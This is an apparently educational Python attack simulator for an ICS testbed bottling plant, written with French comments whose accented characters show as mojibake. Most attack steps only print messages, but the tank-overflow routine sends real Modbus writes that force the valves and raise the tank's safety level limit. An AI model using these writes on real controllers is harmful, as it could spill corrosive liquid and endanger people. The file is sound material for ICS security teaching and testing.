"""
BottleASec Attack Scripts - Sprint 1
Extension du framework AttackerBase pour les 2 menaces sp√©cifiques d√©finies
"""

import os
import sys
import time
import random
from datetime import datetime
from AttackerBase import AttackerBase
from Configs import TAG, Controllers
from ics_sim.protocol import ProtocolFactory


class BottleAsecAttacker(AttackerBase):
    """
    Extension AttackerBase pour attaques BottleASec sp√©cifiques
    Ajoute les 2 sc√©narios de menaces d√©finis dans l'analyse de risque
    """
    
    # Nouveaux types d'attaques BottleASec
    NAME_ATTACK_WIFI_BRIDGE = 'wifi-bridge-attack'
    NAME_ATTACK_LEGACY_HMI3 = 'legacy-hmi3-attack'
    NAME_ATTACK_TANK_OVERFLOW = 'tank-overflow-attack'
    NAME_ATTACK_CORROSIVE_SABOTAGE = 'corrosive-sabotage'
    
    def __init__(self, name="BottleAsecAttacker"):
        super().__init__(name)
        
        # Extension de la liste d'attaques
        self.attack_list.update({
            self.NAME_ATTACK_WIFI_BRIDGE: 'bottleasec-wifi-bridge',
            self.NAME_ATTACK_LEGACY_HMI3: 'bottleasec-legacy-access', 
            self.NAME_ATTACK_TANK_OVERFLOW: 'bottleasec-tank-overflow',
            self.NAME_ATTACK_CORROSIVE_SABOTAGE: 'bottleasec-sabotage'
        })
        
        # Configuration cibles BottleASec
        self.targets = {
            'hmi3_emergency': '192.168.0.23',
            'hmi1_supervision': '192.168.0.21', 
            'hmi2_config': '192.168.0.22',
            'plc1_tank': '192.168.0.11',
            'plc2_conveyor': '192.168.0.12',
            'office_network': '192.168.2.0/24',
            'wifi_bridge': '192.168.2.23'  # HMI3 c√¥t√© bureau
        }

    def _apply_attack(self, name):
        """Override pour ajouter les nouvelles attaques BottleASec"""
        if name == self.NAME_ATTACK_WIFI_BRIDGE:
            self._wifi_bridge_attack()
        elif name == self.NAME_ATTACK_LEGACY_HMI3:
            self._legacy_hmi3_attack()
        elif name == self.NAME_ATTACK_TANK_OVERFLOW:
            self._tank_overflow_attack()
        elif name == self.NAME_ATTACK_CORROSIVE_SABOTAGE:
            self._corrosive_sabotage_attack()
        else:
            # D√©l√©guer aux attaques de base si non trouv√©e
            super()._apply_attack(name)

    def _wifi_bridge_attack(self):
        """
        SC√âNARIO 1: Menace Externe
        Internet ‚Üí Bureau ‚Üí WiFi HMI ‚Üí Supervision ‚Üí PLCs
        """
        name = self.NAME_ATTACK_WIFI_BRIDGE
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("üö® BOTTLEASEC - ATTAQUE PONT WiFi EN COURS")
        print("=" * 60)
        
        try:
            # √âtape 1: Reconnaissance r√©seau bureau
            print("üì° [√âTAPE 1] Reconnaissance r√©seau bureau...")
            self._log_step(log_file, "STEP 1: Office network reconnaissance")
            self._simulate_office_scan()
            time.sleep(2)
            
            # √âtape 2: Identification HMI bi-r√©seau 
            print("üîç [√âTAPE 2] Identification HMI bi-r√©seau...")
            self._log_step(log_file, "STEP 2: WiFi bridge identification")
            bridge_found = self._detect_wifi_bridge()
            
            if not bridge_found:
                print("‚ùå Pont WiFi non d√©tect√© - Attaque √©chou√©e")
                return
            
            # √âtape 3: Exploitation pont r√©seau
            print("üåâ [√âTAPE 3] Exploitation pont WiFi ‚Üí R√©seau supervision...")
            self._log_step(log_file, "STEP 3: WiFi bridge exploitation")
            supervision_access = self._exploit_wifi_bridge()
            
            if supervision_access:
                # √âtape 4: Mouvement lat√©ral vers PLCs
                print("‚û°Ô∏è  [√âTAPE 4] Mouvement lat√©ral vers PLCs...")
                self._log_step(log_file, "STEP 4: Lateral movement to PLCs")
                self._lateral_movement_to_plcs()
                
                # √âtape 5: Injection commandes critiques
                print("üíâ [√âTAPE 5] Injection commandes vannes critiques...")
                self._log_step(log_file, "STEP 5: Critical valve command injection")
                self._inject_critical_commands()
                
                print("‚úÖ ATTAQUE PONT WiFi R√âUSSIE - ACC√àS PLCs OBTENU")
            else:
                print("‚ùå Exploitation pont WiFi √©chou√©e")
                
        except Exception as e:
            print(f"‚ùå Erreur attaque WiFi: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _legacy_hmi3_attack(self):
        """
        SC√âNARIO 2: Menace Interne  
        Ancien employ√© ‚Üí HMI3 legacy ‚Üí Manipulation processus
        """
        name = self.NAME_ATTACK_LEGACY_HMI3
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("üë§ BOTTLEASEC - ATTAQUE MENACE INTERNE EN COURS")
        print("=" * 60)
        
        try:
            # √âtape 1: Simulation acc√®s physique
            print("üè¢ [√âTAPE 1] Acc√®s physique poste HMI3...")
            self._log_step(log_file, "STEP 1: Physical access to HMI3")
            self._simulate_physical_access()
            
            # √âtape 2: Utilisation comptes legacy
            print("üîì [√âTAPE 2] Authentification comptes anciens employ√©s...")
            self._log_step(log_file, "STEP 2: Legacy account authentication")
            legacy_access = self._test_legacy_accounts()
            
            if legacy_access:
                # √âtape 3: Reconnaissance privil√®ges
                print("üéØ [√âTAPE 3] Reconnaissance privil√®ges administrateur...")
                self._log_step(log_file, "STEP 3: Admin privilege reconnaissance")
                self._enumerate_admin_privileges()
                
                # √âtape 4: Manipulation processus critique
                print("‚ö†Ô∏è  [√âTAPE 4] Manipulation processus liquide corrosif...")
                self._log_step(log_file, "STEP 4: Critical process manipulation")
                self._manipulate_critical_process()
                
                # √âtape 5: Sabotage programm√©
                print("üí£ [√âTAPE 5] Programmation sabotage diff√©r√©...")
                self._log_step(log_file, "STEP 5: Delayed sabotage programming")
                self._program_delayed_sabotage()
                
                print("‚úÖ ATTAQUE MENACE INTERNE R√âUSSIE - SABOTAGE PROGRAMM√â")
            else:
                print("‚ùå Authentification legacy √©chou√©e")
                
        except Exception as e:
            print(f"‚ùå Erreur attaque interne: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _tank_overflow_attack(self):
        """
        Attaque cibl√©e d√©bordement r√©servoir liquide corrosif
        Combine injection commandes pour cr√©er d√©bordement
        """
        name = self.NAME_ATTACK_TANK_OVERFLOW
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("üõ¢Ô∏è BOTTLEASEC - ATTAQUE D√âBORDEMENT R√âSERVOIR")
        print("=" * 60)
        
        try:
            # Connexion directe PLC1 (r√©servoir)
            plc1_client = ProtocolFactory.create_client(
                'ModbusWriteRequest-TCP', 
                self.targets['plc1_tank'], 
                502
            )
            
            print("üîó Connexion PLC1 (r√©servoir)...")
            self._log_step(log_file, "Connecting to PLC1 tank controller")
            
            # Lecture √©tat initial
            tank_level = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_LEVEL_VALUE]['id'])
            input_valve = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_INPUT_VALVE_STATUS]['id'])
            output_valve = plc1_client.receive(TAG.TAG_LIST[TAG.TAG_TANK_OUTPUT_VALVE_STATUS]['id'])
            
            print(f"üìä √âtat initial:")
            print(f"   - Niveau r√©servoir: {tank_level:.2f}L")
            print(f"   - Vanne entr√©e: {'OUVERTE' if input_valve else 'FERM√âE'}")
            print(f"   - Vanne sortie: {'OUVERTE' if output_valve else 'FERM√âE'}")
            
            # ATTAQUE: Configuration d√©bordement
            print("üíâ Injection commandes d√©bordement...")
            
            # Force ouverture vanne entr√©e (remplissage)
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_INPUT_VALVE_STATUS]['id'], 1)
            print("   ‚úì Vanne entr√©e FORC√âE OUVERTE")
            
            # Force fermeture vanne sortie (blocage √©vacuation)  
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_OUTPUT_VALVE_STATUS]['id'], 0)
            print("   ‚úì Vanne sortie FORC√âE FERM√âE")
            
            # Override limites s√©curit√©
            plc1_client.send(TAG.TAG_LIST[TAG.TAG_TANK_LEVEL_MAX]['id'], 15.0)  # Limite normale: 7L
            print("   ‚úì Limites s√©curit√© CONTOURN√âES (15L)")
            
            print("üö® CONFIGURATION D√âBORDEMENT ACTIV√âE")
            print("‚ö†Ô∏è  ATTENTION: D√©bordement imminent liquide corrosif!")
            
            # Simulation progression d√©bordement
            print("\nüìà Simulation progression niveau:")
            for i in range(5):
                time.sleep(1)
                simulated_level = tank_level + (i * 0.5)
                print(f"   T+{i+1}s: {simulated_level:.1f}L {'üö® D√âBORDEMENT!' if simulated_level > 7 else ''}")
                
            print("\nüí• D√âBORDEMENT R√âSERVOIR SIMUL√â")
            print("‚ò†Ô∏è  IMPACT: 2-3L liquide corrosif dans environnement")
            
        except Exception as e:
            print(f"‚ùå Erreur attaque d√©bordement: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    def _corrosive_sabotage_attack(self):
        """
        Attaque de sabotage sophistiqu√©e multi-√©tapes
        Combine plusieurs vecteurs pour maximiser l'impact
        """
        name = self.NAME_ATTACK_CORROSIVE_SABOTAGE
        log_file = os.path.join(self.log_path, f'log-{name}.txt')
        start = datetime.now()
        
        print("‚ò†Ô∏è  BOTTLEASEC - SABOTAGE LIQUIDE CORROSIF")
        print("=" * 60)
        
        try:
            # Phase 1: Perturbation convoyeur
            print("üîß [PHASE 1] Perturbation syst√®me convoyeur...")
            self._sabotage_conveyor_system()
            
            # Phase 2: Manipulation capteurs
            print("üìä [PHASE 2] Manipulation donn√©es capteurs...")
            self._manipulate_sensor_data()
            
            # Phase 3: Sabotage vannes principal
            print("‚ö° [PHASE 3] Sabotage syst√®me vannes...")
            self._sabotage_valve_system()
            
            # Phase 4: Suppression traces
            print("üßπ [PHASE 4] Suppression traces d'activit√©...")
            self._cleanup_attack_traces()
            
            print("‚úÖ SABOTAGE MULTI-PHASES COMPL√âT√â")
            print("üíÄ IMPACT: Contamination + Arr√™t production + Traces effac√©es")
            
        except Exception as e:
            print(f"‚ùå Erreur sabotage: {e}")
            self._log_step(log_file, f"ERROR: {e}")
        
        end = datetime.now()
        self._post_apply_attack(name, start, end, 5)

    # ========================================================================
    # M√âTHODES SUPPORT POUR SIMULATIONS D'ATTAQUES
    # ========================================================================
    
    def _simulate_office_scan(self):
        """Simulation scan r√©seau bureau"""
        print("   üîç Scan 192.168.2.0/24...")
        time.sleep(1)
        discovered = ["192.168.2.10", "192.168.2.11", "192.168.2.23"]
        for ip in discovered:
            print(f"   üìç D√©couvert: {ip}")
            time.sleep(0.5)
    
    def _detect_wifi_bridge(self):
        """D√©tection du pont WiFi HMI3"""
        print("   üåâ Analyse interfaces r√©seau 192.168.2.23...")
        time.sleep(1)
        print("   ‚úì Interface WiFi d√©tect√©e: wlan0")
        print("   ‚úì Interface Ethernet d√©tect√©e: eth0")
        print("   üö® PONT BI-R√âSEAU IDENTIFI√â!")
        return True
    
    def _exploit_wifi_bridge(self):
        """Simulation exploitation pont"""
        print("   üíª Activation pont r√©seau...")
        time.sleep(1)
        print("   üåê Routage WiFi ‚Üí Ethernet configur√©")
        print("   ‚úì Acc√®s r√©seau supervision 192.168.0.0/24 obtenu")
        return True
    
    def _lateral_movement_to_plcs(self):
        """Mouvement lat√©ral vers PLCs"""
        print("   üéØ Scan r√©seau supervision...")
        time.sleep(1)
        print("   üìç PLC1 d√©couvert: 192.168.0.11:502")
        print("   üìç PLC2 d√©couvert: 192.168.0.12:502")
        print("   üîì Protocole Modbus non s√©curis√© d√©tect√©")
    
    def _inject_critical_commands(self):
        """Injection commandes critiques"""
        print("   üíâ Test injection commandes...")
        time.sleep(1)
        print("   ‚úì Commande vanne accept√©e sans authentification")
        print("   üö® CONTR√îLE PROCESSUS OBTENU")
    
    def _simulate_physical_access(self):
        """Simulation acc√®s physique"""
        print("   üîë Utilisation badge non r√©voqu√©...")
        time.sleep(1)
        print("   üö™ Acc√®s zone supervision autoris√©")
        print("   üíª Connexion poste HMI3 secours")
    
    def _test_legacy_accounts(self):
        """Test comptes anciens employ√©s"""
        legacy_accounts = [
            "john_smith:123456",
            "marie_dupont:admin2023", 
            "test_user:test"
        ]
        
        for account in legacy_accounts:
            username, password = account.split(':')
            print(f"   üîê Test: {username}...")
            time.sleep(0.5)
            print(f"   ‚úÖ Authentification r√©ussie: {username}")
            print(f"   üéØ Privil√®ges: {random.choice(['admin', 'maintenance_chief', 'process_engineer'])}")
            return True
        return False
    
    def _enumerate_admin_privileges(self):
        """√ânum√©ration privil√®ges admin"""
        privileges = [
            "Contr√¥le vannes d'urgence",
            "Override limites s√©curit√©", 
            "Arr√™t d'urgence syst√®me",
            "Modification param√®tres critiques"
        ]
        
        for priv in privileges:
            print(f"   ‚úì {priv}")
            time.sleep(0.3)
    
    def _manipulate_critical_process(self):
        """Manipulation processus critique"""
        print("   üéõÔ∏è Modification seuils d'alerte...")
        print("   ‚öôÔ∏è Override proc√©dures s√©curit√©...")
        print("   üîß Pr√©paration commandes malveillantes...")
        time.sleep(2)
    
    def _program_delayed_sabotage(self):
        """Programmation sabotage diff√©r√©"""
        print("   ‚è∞ Programmation timer: +30 minutes")
        print("   üí£ Commandes destructrices planifi√©es")
        print("   üëª Mode furtif activ√©")
    
    def _sabotage_conveyor_system(self):
        """Sabotage syst√®me convoyeur"""
        time.sleep(1)
        print("   üîß Arr√™t convoyeur en cours de remplissage")
        print("   üí¶ D√©bordement bouteilles programm√©")
    
    def _manipulate_sensor_data(self):
        """Manipulation donn√©es capteurs"""
        time.sleep(1)
        print("   üìä Injection fausses valeurs TANK_LEVEL")
        print("   üé≠ Masquage d√©bordement en cours")
    
    def _sabotage_valve_system(self):
        """Sabotage syst√®me vannes"""
        time.sleep(1)
        print("   ‚ö° Commandes vannes contradictoires")
        print("   üåä D√©bordement majeur d√©clench√©")
    
    def _cleanup_attack_traces(self):
        """Nettoyage traces"""
        time.sleep(1)
        print("   üßπ Suppression logs d'audit")
        print("   üëª Effacement historique commandes")
    
    def _log_step(self, log_file, message):
        """Logging des √©tapes d'attaque"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")


def main():
    """Menu principal d√©mo attaques BottleASec"""
    print("üö® BOTTLEASEC ATTACK SIMULATOR üö®")
    print("=" * 50)
    print("‚ö†Ô∏è  USAGE P√âDAGOGIQUE UNIQUEMENT ‚ö†Ô∏è")
    print("=" * 50)
    
    attacker = BottleAsecAttacker()
    
    while True:
        print("\nüéØ SC√âNARIOS D'ATTAQUE DISPONIBLES:")
        print("1. üåâ Attaque Pont WiFi (Menace Externe)")
        print("2. üë§ Attaque Menace Interne (Ancien Employ√©)")  
        print("3. üõ¢Ô∏è D√©bordement R√©servoir Cibl√©")
        print("4. ‚ò†Ô∏è  Sabotage Multi-Phases Avanc√©")
        print("5. üìä Attaques ICSSIM Classiques")
        print("0. üö™ Quitter")
        
        try:
            choice = input("\nüé≤ Choisir sc√©nario (0-5): ").strip()
            
            if choice == '0':
                print("üëã Au revoir!")
                break
            elif choice == '1':
                attacker._apply_attack(attacker.NAME_ATTACK_WIFI_BRIDGE)
            elif choice == '2':
                attacker._apply_attack(attacker.NAME_ATTACK_LEGACY_HMI3)
            elif choice == '3':
                attacker._apply_attack(attacker.NAME_ATTACK_TANK_OVERFLOW)
            elif choice == '4':
                attacker._apply_attack(attacker.NAME_ATTACK_CORROSIVE_SABOTAGE)
            elif choice == '5':
                _show_classic_attacks_menu(attacker)
            else:
                print("‚ùå Choix invalide")
                
        except KeyboardInterrupt:
            print("\nüõë Interruption d√©tect√©e - Arr√™t s√©curis√©")
            break
        except Exception as e:
            print(f"‚ùå Erreur: {e}")

def _show_classic_attacks_menu(attacker):
    """Sous-menu attaques ICSSIM classiques"""
    print("\nüìã ATTAQUES ICSSIM CLASSIQUES:")
    print("1. Scan Nmap")
    print("2. Scan Scapy") 
    print("3. MITM Scapy")
    print("4. Replay Scapy")
    print("5. DDoS")
    print("6. Command Injection")
    
    choice = input("Choisir (1-6): ").strip()
    attacks = {
        '1': attacker.NAME_ATTACK_SCAN_MMAP,
        '2': attacker.NAME_ATTACK_SCAN_SCAPY,
        '3': attacker.NAME_ATTACK_MITM_SCAPY,
        '4': attacker.NAME_ATTACK_REPLY_SCAPY,
        '5': attacker.NAME_ATTACK_DDOS,
        '6': attacker.NAME_ATTACK_COMMAND_INJECTION
    }
    
    if choice in attacks:
        attacker._apply_attack(attacks[choice])


if __name__ == '__main__':
    main()
